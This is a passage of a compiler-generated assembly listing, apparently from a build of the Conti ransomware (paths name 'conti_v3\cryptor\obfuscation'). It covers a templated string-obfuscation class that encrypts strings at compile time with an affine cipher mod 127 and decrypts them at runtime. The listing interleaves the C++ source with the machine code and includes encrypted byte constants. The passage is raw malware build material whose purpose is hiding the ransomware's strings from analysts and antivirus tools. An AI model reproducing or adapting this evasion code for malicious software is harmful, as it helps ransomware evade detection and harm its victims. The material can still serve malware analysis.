  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CJ@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<41,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0CJ@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0CJ@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<41,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::MetaBuffer<41,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 26	 mov	 BYTE PTR [rcx+1], 38	; 00000026H
  00007	c6 41 02 5d	 mov	 BYTE PTR [rcx+2], 93	; 0000005dH
  0000b	c6 41 03 57	 mov	 BYTE PTR [rcx+3], 87	; 00000057H
  0000f	c6 41 04 5d	 mov	 BYTE PTR [rcx+4], 93	; 0000005dH
  00013	c6 41 05 5d	 mov	 BYTE PTR [rcx+5], 93	; 0000005dH
  00017	c6 41 06 5d	 mov	 BYTE PTR [rcx+6], 93	; 0000005dH
  0001b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0001f	48 8b c1	 mov	 rax, rcx
  00022	c3		 ret	 0
??0?$MetaBuffer@$0CJ@$0FN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<41,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::MetaBuffer<41,93,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DF@$0BM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0DF@$0BM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<53,28,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 6c		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 3e 00 00
	00		 mov	 r11d, 62		; 0000003eH
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 1c	 sub	 ecx, 28

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 8d 04 49	 lea	 r8d, DWORD PTR [rcx+rcx*2]
  00034	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00038	41 f7 e8	 imul	 r8d
  0003b	41 03 d0	 add	 edx, r8d
  0003e	c1 fa 06	 sar	 edx, 6
  00041	8b c2		 mov	 eax, edx
  00043	c1 e8 1f	 shr	 eax, 31
  00046	03 d0		 add	 edx, eax
  00048	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004b	44 2b c0	 sub	 r8d, eax
  0004e	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00053	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00057	41 f7 e8	 imul	 r8d
  0005a	41 03 d0	 add	 edx, r8d
  0005d	c1 fa 06	 sar	 edx, 6
  00060	8b c2		 mov	 eax, edx
  00062	c1 e8 1f	 shr	 eax, 31
  00065	03 d0		 add	 edx, eax
  00067	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0006a	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0006d	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  00071	49 83 eb 01	 sub	 r11, 1
  00075	75 a9		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00077	49 8b c1	 mov	 rax, r9
  0007a	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DF@$0BM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<53,28,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0DF@$0BM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0DF@$0BM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<53,28,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::MetaBuffer<53,28,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 6d	 mov	 BYTE PTR [rcx+1], 109	; 0000006dH
  00007	c6 41 02 1c	 mov	 BYTE PTR [rcx+2], 28
  0000b	c6 41 03 02	 mov	 BYTE PTR [rcx+3], 2
  0000f	c6 41 04 1c	 mov	 BYTE PTR [rcx+4], 28
  00013	c6 41 05 77	 mov	 BYTE PTR [rcx+5], 119	; 00000077H
  00017	c6 41 06 1c	 mov	 BYTE PTR [rcx+6], 28
  0001b	c6 41 07 02	 mov	 BYTE PTR [rcx+7], 2
  0001f	c6 41 08 1c	 mov	 BYTE PTR [rcx+8], 28
  00023	c6 41 09 17	 mov	 BYTE PTR [rcx+9], 23
  00027	c6 41 0a 1c	 mov	 BYTE PTR [rcx+10], 28
  0002b	c6 41 0b 23	 mov	 BYTE PTR [rcx+11], 35	; 00000023H
  0002f	c6 41 0c 1c	 mov	 BYTE PTR [rcx+12], 28
  00033	c6 41 0d 49	 mov	 BYTE PTR [rcx+13], 73	; 00000049H
  00037	c6 41 0e 1c	 mov	 BYTE PTR [rcx+14], 28
  0003b	c6 41 0f 5f	 mov	 BYTE PTR [rcx+15], 95	; 0000005fH
  0003f	c6 41 10 1c	 mov	 BYTE PTR [rcx+16], 28
  00043	c6 41 11 49	 mov	 BYTE PTR [rcx+17], 73	; 00000049H
  00047	c6 41 12 1c	 mov	 BYTE PTR [rcx+18], 28
  0004b	c6 41 13 37	 mov	 BYTE PTR [rcx+19], 55	; 00000037H
  0004f	c6 41 14 1c	 mov	 BYTE PTR [rcx+20], 28
  00053	c6 41 15 38	 mov	 BYTE PTR [rcx+21], 56	; 00000038H
  00057	c6 41 16 1c	 mov	 BYTE PTR [rcx+22], 28
  0005b	c6 41 17 18	 mov	 BYTE PTR [rcx+23], 24
  0005f	c6 41 18 1c	 mov	 BYTE PTR [rcx+24], 28
  00063	c6 41 19 2d	 mov	 BYTE PTR [rcx+25], 45	; 0000002dH
  00067	c6 41 1a 1c	 mov	 BYTE PTR [rcx+26], 28
  0006b	c6 41 1b 49	 mov	 BYTE PTR [rcx+27], 73	; 00000049H
  0006f	c6 41 1c 1c	 mov	 BYTE PTR [rcx+28], 28
  00073	c6 41 1d 43	 mov	 BYTE PTR [rcx+29], 67	; 00000043H
  00077	c6 41 1e 1c	 mov	 BYTE PTR [rcx+30], 28
  0007b	c6 41 1f 05	 mov	 BYTE PTR [rcx+31], 5
  0007f	c6 41 20 1c	 mov	 BYTE PTR [rcx+32], 28
  00083	c6 41 21 10	 mov	 BYTE PTR [rcx+33], 16
  00087	c6 41 22 1c	 mov	 BYTE PTR [rcx+34], 28
  0008b	c6 41 23 40	 mov	 BYTE PTR [rcx+35], 64	; 00000040H
  0008f	c6 41 24 1c	 mov	 BYTE PTR [rcx+36], 28
  00093	c6 41 25 0b	 mov	 BYTE PTR [rcx+37], 11
  00097	c6 41 26 1c	 mov	 BYTE PTR [rcx+38], 28
  0009b	c6 41 27 6e	 mov	 BYTE PTR [rcx+39], 110	; 0000006eH
  0009f	c6 41 28 1c	 mov	 BYTE PTR [rcx+40], 28
  000a3	c6 41 29 6d	 mov	 BYTE PTR [rcx+41], 109	; 0000006dH
  000a7	c6 41 2a 1c	 mov	 BYTE PTR [rcx+42], 28
  000ab	c6 41 2b 4f	 mov	 BYTE PTR [rcx+43], 79	; 0000004fH
  000af	c6 41 2c 1c	 mov	 BYTE PTR [rcx+44], 28
  000b3	c6 41 2d 59	 mov	 BYTE PTR [rcx+45], 89	; 00000059H
  000b7	c6 41 2e 1c	 mov	 BYTE PTR [rcx+46], 28
  000bb	c6 41 2f 79	 mov	 BYTE PTR [rcx+47], 121	; 00000079H
  000bf	c6 41 30 1c	 mov	 BYTE PTR [rcx+48], 28
  000c3	c6 41 31 45	 mov	 BYTE PTR [rcx+49], 69	; 00000045H
  000c7	c6 41 32 1c	 mov	 BYTE PTR [rcx+50], 28
  000cb	c6 41 33 70	 mov	 BYTE PTR [rcx+51], 112	; 00000070H
  000cf	c6 41 34 1c	 mov	 BYTE PTR [rcx+52], 28
  000d3	c6 41 35 17	 mov	 BYTE PTR [rcx+53], 23
  000d7	c6 41 36 1c	 mov	 BYTE PTR [rcx+54], 28
  000db	c6 41 37 45	 mov	 BYTE PTR [rcx+55], 69	; 00000045H
  000df	c6 41 38 1c	 mov	 BYTE PTR [rcx+56], 28
  000e3	c6 41 39 7a	 mov	 BYTE PTR [rcx+57], 122	; 0000007aH
  000e7	c6 41 3a 1c	 mov	 BYTE PTR [rcx+58], 28
  000eb	c6 41 3b 5b	 mov	 BYTE PTR [rcx+59], 91	; 0000005bH
  000ef	c6 41 3c 1c	 mov	 BYTE PTR [rcx+60], 28
  000f3	c6 41 3d 1c	 mov	 BYTE PTR [rcx+61], 28
  000f7	c6 41 3e 1c	 mov	 BYTE PTR [rcx+62], 28
  000fb	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  000ff	48 8b c1	 mov	 rax, rcx
  00102	c3		 ret	 0
??0?$MetaBuffer@$0DF@$0BM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<53,28,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::MetaBuffer<53,28,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DL@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0DL@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<59,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 08 00 00
	00		 mov	 r11d, 8
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 21	 sub	 ecx, 33			; 00000021H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 1c	 imul	 r8d, ecx, 28

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DL@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<59,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0DL@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0DL@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<59,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::MetaBuffer<59,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 56	 mov	 BYTE PTR [rcx+1], 86	; 00000056H
  00007	c6 41 02 21	 mov	 BYTE PTR [rcx+2], 33	; 00000021H
  0000b	c6 41 03 71	 mov	 BYTE PTR [rcx+3], 113	; 00000071H
  0000f	c6 41 04 21	 mov	 BYTE PTR [rcx+4], 33	; 00000021H
  00013	c6 41 05 48	 mov	 BYTE PTR [rcx+5], 72	; 00000048H
  00017	c6 41 06 21	 mov	 BYTE PTR [rcx+6], 33	; 00000021H
  0001b	c6 41 07 21	 mov	 BYTE PTR [rcx+7], 33	; 00000021H
  0001f	c6 41 08 21	 mov	 BYTE PTR [rcx+8], 33	; 00000021H
  00023	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00027	48 8b c1	 mov	 rax, rcx
  0002a	c3		 ret	 0
??0?$MetaBuffer@$0DL@$0CB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<59,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::MetaBuffer<59,33,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BN@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BN@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<29,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 16 00 00
	00		 mov	 r10d, 22
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 42 00 00 00	 mov	 eax, 66			; 00000042H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 23	 imul	 ecx, eax, 35		; 00000023H

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BN@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<29,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BN@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BN@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<29,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::MetaBuffer<29,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
